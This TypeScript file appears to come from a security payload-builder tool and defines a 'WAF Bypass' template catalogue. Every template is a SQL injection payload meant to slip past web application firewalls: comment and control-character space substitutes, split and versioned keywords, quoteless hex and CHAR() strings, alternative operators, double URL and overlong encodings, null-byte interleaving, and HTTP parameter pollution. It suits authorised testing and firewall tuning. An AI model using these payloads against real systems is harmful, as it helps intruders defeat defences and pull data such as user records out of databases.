import { TemplateCategory } from '../../types/template';

export const wafBypassCategory: TemplateCategory = {
  id: 'waf-bypass',
  label: 'WAF Bypass',
  description: 'WAF evasion syntax patterns, space delimiters, keyword obfuscation, quoteless strings, operator alternatives, and tamper presets',
  iconName: 'ShieldAlert',
  subcategories: [
    // ========================================================================
    // 1. SPACE REPLACEMENTS & DELIMITERS
    // ========================================================================
    {
      id: 'space-replacements',
      label: 'Space Replacements',
      description: 'Alternative delimiters and whitespace substitutes when standard spaces (%20) are blocked by WAF inspection rules',
      templates: [
        {
          id: 'waf-space-inline-comment',
          name: 'Standard Inline Comment (/**/)',
          description: 'Replaces whitespace with standard C-style inline comment delimiters',
          content: 'SELECT/**/{columns}/**/FROM/**/{table}/**/WHERE/**/{condition}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2,3', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-comment-bang',
          name: 'MySQL Bang Comment (/*!--+*/)',
          description: 'Uses MySQL exclamation bang inline comments recognized as whitespace delimiters',
          content: 'SELECT/*!--+*/{columns}/*!--+*/FROM/**/{table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,version()', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-tab-char',
          name: 'Tab Delimiter (%09)',
          description: 'Replaces space with horizontal tab character URL-encoded as %09',
          content: 'SELECT%09{columns}%09FROM%09{table}%09WHERE%09{condition}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,user()', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-linefeed-char',
          name: 'Line Feed Delimiter (%0A)',
          description: 'Replaces space with newline linefeed character URL-encoded as %0A',
          content: 'SELECT%0A{columns}%0AFROM%0A{table}%0AWHERE%0A{condition}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,database()', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-carriage-return',
          name: 'Carriage Return Delimiter (%0D)',
          description: 'Replaces space with carriage return character URL-encoded as %0D',
          content: 'SELECT%0D{columns}%0DFROM%0D{table}%0DWHERE%0D{condition}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,schema()', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-vertical-tab',
          name: 'Vertical Tab Delimiter (%0B)',
          description: 'Replaces space with vertical tab character URL-encoded as %0B',
          content: 'SELECT%0B{columns}%0BFROM%0B{table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-formfeed-char',
          name: 'Form Feed Delimiter (%0C)',
          description: 'Replaces space with form feed character URL-encoded as %0C',
          content: 'SELECT%0C{columns}%0CFROM%0C{table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-parentheses',
          name: 'Zero-Space Parenthesis Grouping',
          description: 'Eliminates spaces completely by enclosing SQL tokens inside parentheses',
          content: 'SELECT({columns})FROM({table})WHERE({condition})',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: 'username', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: 'id=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-space-plus-sign',
          name: 'Plus Sign Spacer (+)',
          description: 'Uses URL-encoded plus sign (+) for space substitution in URL query string contexts',
          content: 'SELECT+{columns}+FROM+{table}+WHERE+{condition}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 2. KEYWORD OBFUSCATION & SPLITTING
    // ========================================================================
    {
      id: 'keyword-obfuscation',
      label: 'Keyword Obfuscation',
      description: 'Techniques for evading signature rules matching SQL keywords (UNION, SELECT, WHERE, FROM)',
      templates: [
        {
          id: 'waf-kw-mysql-version-select',
          name: 'MySQL Version Comment (/*!50000SELECT*/)',
          description: 'MySQL conditional execution comments executed only on version >= 5.00.00',
          content: '/*!50000SELECT*/ {columns} /*!50000FROM*/ {table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,version()', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-kw-mysql-version-union',
          name: 'MySQL Versioned UNION ALL SELECT',
          description: 'Encapsulates entire UNION ALL SELECT clause in MySQL conditional execution comments',
          content: '/*!12345UNION*//*!12345ALL*//*!12345SELECT*/ {columns}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2,3', inputType: 'text' }
          ]
        },
        {
          id: 'waf-kw-inline-comment-split',
          name: 'Inline Comment Splice (UNI/*foo*/ON)',
          description: 'Splices SQL keywords with arbitrary inline comments to evade exact string matching',
          content: 'UNI/*foo*/ON/**/SEL/*bar*/ECT/**/{columns}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' }
          ]
        },
        {
          id: 'waf-kw-mixed-case',
          name: 'Case Alternation (uNiOn sElEcT)',
          description: 'Alters letter casing to test case-sensitive regular expression blacklist filters',
          content: 'uNiOn/**/sElEcT/**/{columns}/**/fRoM/**/{table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-kw-nested-keyword-strip',
          name: 'Nested Keyword Strip Bypass (UNUNIONION)',
          description: 'Evades non-recursive keyword stripping by nesting keyword inside itself',
          content: 'UNUNIONION/**/SELSELECTECT/**/{columns}/**/FRFROMOM/**/{table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-kw-comment-in-middle',
          name: 'Middle Comment Splice (UN/**/ION)',
          description: 'Splits individual tokens into dual parts separated by an empty comment',
          content: 'UN/**/ION/**/SE/**/LECT/**/{columns}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' }
          ]
        },
        {
          id: 'waf-kw-mysql-exec-concat',
          name: 'Dynamic Execution (PREPARE stmt)',
          description: 'Assembles blocked query dynamically via string concatenation and executes with PREPARE',
          content: 'PREPARE stmt FROM CONCAT(\'SEL\',\'ECT \',\'1,2\'); EXECUTE stmt;'
        },
        {
          id: 'waf-kw-multiline-comment',
          name: 'Multi-Line Comment Breakouts',
          description: 'Spans comments across multiple lines to confuse single-line regex engines',
          content: 'SELECT/*\n*//*{columns}*/1,2/*\n*/FROM/*\n*/users'
        },
        {
          id: 'waf-kw-backtick-quote',
          name: 'Backtick Enclosure (`table`)',
          description: 'Encloses table and column identifiers in MySQL backticks to bypass identifier filters',
          content: 'SELECT `{columns}` FROM `{table}` WHERE `{condition}`',
          parameters: [
            { id: 'columns', label: 'Column Name', defaultValue: 'username', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' },
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 3. QUOTELESS STRINGS & VALUES
    // ========================================================================
    {
      id: 'quoteless-strings',
      label: 'Quoteless Strings',
      description: 'String and value representations avoiding literal quotation marks (\' or ") completely',
      templates: [
        {
          id: 'waf-quote-hex-literal',
          name: 'Hexadecimal Literal (0x61646d696e)',
          description: 'Hex string literal representing \'admin\' without using single or double quotes',
          content: '0x61646d696e'
        },
        {
          id: 'waf-quote-char-function',
          name: 'MySQL CHAR() Function',
          description: 'Constructs \'admin\' from ASCII ordinal byte codes (97,100,109,105,110)',
          content: 'CHAR(97,100,109,105,110)'
        },
        {
          id: 'waf-quote-chr-concat-pg',
          name: 'PostgreSQL / Oracle CHR() Concat',
          description: 'PostgreSQL / Oracle string construction using CHR() and pipe concatenation (||)',
          content: 'CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)'
        },
        {
          id: 'waf-quote-concat-string',
          name: 'CONCAT() ASCII Function',
          description: 'Combines separate character values using the CONCAT function',
          content: 'CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))'
        },
        {
          id: 'waf-quote-unhex-function',
          name: 'UNHEX() Decoded String',
          description: 'Decodes raw hexadecimal string pairs back to byte characters',
          content: 'UNHEX(\'61646d696e\')'
        },
        {
          id: 'waf-quote-conv-base',
          name: 'CONV() Base-36 Numeric Conversion',
          description: 'Converts base-36 alphanumeric representations into strings without quotes',
          content: 'CONV(10,10,36)'
        },
        {
          id: 'waf-quote-mssql-char',
          name: 'MSSQL CHAR() Plus Concatenation',
          description: 'SQL Server string concatenation using plus operator (+) and CHAR codes',
          content: 'CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)'
        },
        {
          id: 'waf-quote-cast-hex',
          name: 'MSSQL CAST Hex to VARCHAR',
          description: 'Casts raw binary hex sequence directly to VARCHAR string representation',
          content: 'CAST(0x61646d696e AS VARCHAR)'
        }
      ]
    },

    // ========================================================================
    // 4. OPERATOR ALTERNATIVES
    // ========================================================================
    {
      id: 'operator-alternatives',
      label: 'Operator Alternatives',
      description: 'Alternative logical, comparison, and evaluation operators when =, AND, or OR are restricted',
      templates: [
        {
          id: 'waf-op-like-equal',
          name: 'LIKE Operator (Replacing =)',
          description: 'Uses SQL LIKE operator instead of the equality sign (=)',
          content: 'WHERE {column} LIKE {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'username', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '0x61646d696e', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-rlike-regexp',
          name: 'RLIKE / REGEXP (Replacing =)',
          description: 'Uses regular expression matching operators (RLIKE or REGEXP) instead of =',
          content: 'WHERE {column} RLIKE {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'username', inputType: 'text' },
            { id: 'value', label: 'Regex Value', defaultValue: '0x61646d696e', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-in-clause',
          name: 'IN() Set Membership (Replacing =)',
          description: 'Uses IN set membership syntax to test equality without using an equal sign',
          content: 'WHERE {column} IN ({value})',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'id', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-between-clause',
          name: 'BETWEEN Operator (Replacing =)',
          description: 'Uses BETWEEN with identical boundaries to assert exact equality without =',
          content: 'WHERE {column} BETWEEN {value} AND {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'id', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-double-ampersand',
          name: 'Symbolic AND (&&)',
          description: 'Replaces keyword AND with symbolic double ampersand (&&)',
          content: '&& ({condition})',
          parameters: [
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-double-pipe',
          name: 'Symbolic OR (||)',
          description: 'Replaces keyword OR with symbolic double pipe (||)',
          content: '|| ({condition})',
          parameters: [
            { id: 'condition', label: 'Condition', defaultValue: '1=1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-boolean-greater-less',
          name: 'Greater & Less Range Comparison',
          description: 'Tests equality using exclusive range boundary comparisons (< and >)',
          content: 'WHERE ({column} > 0 AND {column} < 2)',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'id', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-strcmp',
          name: 'STRCMP() Comparison Function',
          description: 'Compares strings returning 0 on exact match (STRCMP(s1,s2) = 0)',
          content: 'WHERE STRCMP({column}, {value}) = 0',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'username', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '0x61646d696e', inputType: 'text' }
          ]
        },
        {
          id: 'waf-op-soundex',
          name: 'SOUNDS LIKE Phonetic Match',
          description: 'Matches strings phonetically using SOUNDS LIKE operator',
          content: 'WHERE {column} SOUNDS LIKE {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'username', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '\'admin\'', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 5. ENCODING & CHARSET TRANSFORMATIONS
    // ========================================================================
    {
      id: 'encoding-bypass',
      label: 'Encoding & Charset',
      description: 'URL double encoding, Unicode overlong sequences, and character representation anomalies',
      templates: [
        {
          id: 'waf-enc-double-url-space',
          name: 'Double URL-Encoded Space (%2520)',
          description: 'Double-encoded space character (%20 -> %2520) decoded by vulnerable multi-tier proxies',
          content: '%2520UNION%2520SELECT%2520'
        },
        {
          id: 'waf-enc-double-url-quote',
          name: 'Double URL-Encoded Single Quote (%2527)',
          description: 'Double-encoded single quotation mark (%27 -> %2527)',
          content: '%2527'
        },
        {
          id: 'waf-enc-double-url-comment',
          name: 'Double URL-Encoded Hash Comment (%2523)',
          description: 'Double-encoded hash comment symbol (%23 -> %2523)',
          content: '%2523'
        },
        {
          id: 'waf-enc-unicode-slash',
          name: 'Unicode Overlong Slash (%c0%af)',
          description: 'UTF-8 overlong encoding sequence for forward slash character',
          content: '%c0%af'
        },
        {
          id: 'waf-enc-unicode-dot',
          name: 'Unicode Overlong Dot (%c0%2e)',
          description: 'UTF-8 overlong encoding sequence for period/dot character',
          content: '%c0%2e'
        },
        {
          id: 'waf-enc-high-byte',
          name: 'Non-Breaking Space High Byte (%a0)',
          description: 'Non-breaking space (%A0) parsed as valid whitespace by backend database engines',
          content: '%a0UNION%a0SELECT%a0'
        },
        {
          id: 'waf-enc-url-hex-full',
          name: 'Full URL-Hex Encoded Keywords',
          description: 'Hex-encodes entire keyword string to test deep decoding inspection capabilities',
          content: '%55%4e%49%4f%4e%20%53%45%4c%45%43%54'
        },
        {
          id: 'waf-enc-null-interleaved',
          name: 'Null Byte Interleaving (U%00N%00I%00O%00N)',
          description: 'Interleaves null bytes between characters to disrupt string matching signatures',
          content: 'U%00N%00I%00O%00N%20S%00E%00L%00E%00C%00T'
        },
        {
          id: 'waf-enc-scientific-notation',
          name: 'Scientific Notation Numeric Format',
          description: 'Expresses numbers using scientific notation (1e0 = 1) to evade digit filters',
          content: '1e0 UNION SELECT {columns}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 6. POPULAR TAMPER HEURISTIC PRESETS
    // ========================================================================
    {
      id: 'tamper-presets',
      label: 'Tamper Presets',
      description: 'Standard auditing tamper heuristic patterns modeled after proven security assessment scripts',
      templates: [
        {
          id: 'waf-tamper-space2comment',
          name: 'tamper: space2comment',
          description: 'Replaces every space character with an inline comment block (/**/)',
          content: 'SELECT/**/{columns}/**/FROM/**/{table}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,version()', inputType: 'text' },
            { id: 'table', label: 'Table Name', defaultValue: 'users', inputType: 'text' }
          ]
        },
        {
          id: 'waf-tamper-between',
          name: 'tamper: between',
          description: 'Replaces equality checks with BETWEEN clauses (BETWEEN x AND x)',
          content: 'WHERE {column} BETWEEN {value} AND {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'id', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-tamper-versionedmore',
          name: 'tamper: versionedmorekeywords',
          description: 'Encloses multiple keywords inside version-specific comment wrappers',
          content: '/*!50000UNION*//*!50000ALL*//*!50000SELECT*//*!500001,2,3*/'
        },
        {
          id: 'waf-tamper-randomcase',
          name: 'tamper: randomcase',
          description: 'Heuristic random casing of SQL keywords (uNiOn aLl sElEcT)',
          content: 'uNiOn aLl sElEcT {columns}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' }
          ]
        },
        {
          id: 'waf-tamper-equaltolike',
          name: 'tamper: equaltolike',
          description: 'Replaces equal sign (=) with LIKE comparison operator',
          content: 'WHERE {column} LIKE {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'id', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-tamper-greatest',
          name: 'tamper: greatest',
          description: 'Uses GREATEST() function to perform boundary and equality checks',
          content: 'WHERE GREATEST({column}, 0) = {value}',
          parameters: [
            { id: 'column', label: 'Column', defaultValue: 'id', inputType: 'text' },
            { id: 'value', label: 'Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'waf-tamper-charencode',
          name: 'tamper: charencode',
          description: 'Replaces string literals with numeric character addition sequences',
          content: 'CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)'
        },
        {
          id: 'waf-tamper-hpp',
          name: 'HTTP Parameter Pollution (HPP) Split',
          description: 'Splits query components across repeated parameters to evade single-parameter inspection',
          content: 'id=1&id=UNION&id=SELECT&id={columns}',
          parameters: [
            { id: 'columns', label: 'Columns', defaultValue: '1,2', inputType: 'text' }
          ]
        }
      ]
    }
  ]
};
